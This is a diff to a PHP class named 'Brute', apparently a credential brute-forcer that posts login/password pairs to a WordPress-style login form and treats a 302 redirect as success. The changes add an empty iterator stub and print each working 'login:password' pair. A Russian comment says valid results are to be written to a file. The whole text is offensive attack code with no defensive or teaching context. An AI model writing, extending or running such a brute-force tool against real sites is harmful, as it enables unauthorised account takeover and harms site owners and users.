@@ -14,6 +14,7 @@ class Brute
     private $url;
     private $login;
     private $password;
+    private $iteration;
 
     public function __construct()
     {
@@ -21,13 +22,18 @@ class Brute
             ->retry(3)
             ->followRedirects(0)
             ->build();
+
+        $this->iteration = true;
     }
 
     public function __invoke($data)
     {
-        $this->loginCheck($data);
         $this->password = $data['password'];
         $this->url = explode(';', $data['url'])[0];
+
+        $this->loginCheck($data);
+        $this->checkIterator($data['login']);
+
 
         $body = new FormBody;
         $body->addField('log', $this->login);
@@ -39,15 +45,11 @@ class Brute
 
         $response = yield $this->client->request($request);
 
-        echo $response->getStatus() . PHP_EOL;
-
         if ($response->getStatus() == 302) {
-            echo "valid!" . PHP_EOL;
+            echo $this->login . ":" . $this->password . PHP_EOL;
+            // тут пишем valid в файл
         }
 
-
-
-//        yield from $this->request(explode(';', $data['url'])[0]);
     }
 
     public function loginCheck($data) {
@@ -58,6 +60,10 @@ class Brute
         } else {
             $this->login = $data['login'];
         }
+    }
+
+    public function checkIterator($login) {
+
     }
 
     public function request($url) {
